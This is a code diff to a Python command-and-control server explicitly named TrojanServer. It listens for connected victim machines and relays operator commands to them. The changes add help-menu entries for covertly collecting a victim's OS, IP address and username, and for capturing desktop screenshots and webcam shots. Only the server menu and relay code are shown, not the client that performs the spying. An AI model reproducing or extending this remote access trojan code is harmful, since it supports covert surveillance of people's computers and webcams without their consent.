@@ -1,4 +1,5 @@
 import socket,threading
+import os
 
 class TrojanServer(object):
     def __init__(self):
@@ -8,6 +9,7 @@ class TrojanServer(object):
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.s.bind((self.host, self.port))
         print("Server running...")
+        print("type 'help' for commands")
 
     def listener(self):
         self.s.listen(10)
@@ -40,12 +42,19 @@ class TrojanServer(object):
             
             ### HELP ###
             elif cmd.lower() == "help" or cmd.lower() == "?":
+                print()
                 print("COMMANDS:")
                 print("=========")
                 print("show clients         - List all connected clients")
+                print("show os              - show you the OS")
+                print("show global ip       - show the global IP")
+                print("show username        - show username from the user") 
                 print("useconn [IP:PORT]    - Switch to the connection")
-                print("Bye!                 - closes the connection from the client")
+                print("make screenshot      - make a screenshot from the desktop")
+                print("make cam shot        - make a shot from the webcam")
+                print("exit client          - closes the connection from the client")
                 print("help                 - Show all commands and options")
+                print()
 
             ### SEND ###
             else:
@@ -58,8 +67,10 @@ class TrojanServer(object):
                     data = client.recv(8192).decode("UTF-8",errors="replace")
 
                     if data:
-                        print(str(data))
-                        if str(data) == "Bye!":
+                        #print("[from "+str(address[0])+":"+str(address[1])+"] >>"+str(data))
+                        print(">> "+str(data))
+
+                        if str(data).lower() == "exit client":
                             raise ConnectionError("Client disconnected")
                     
                     else:
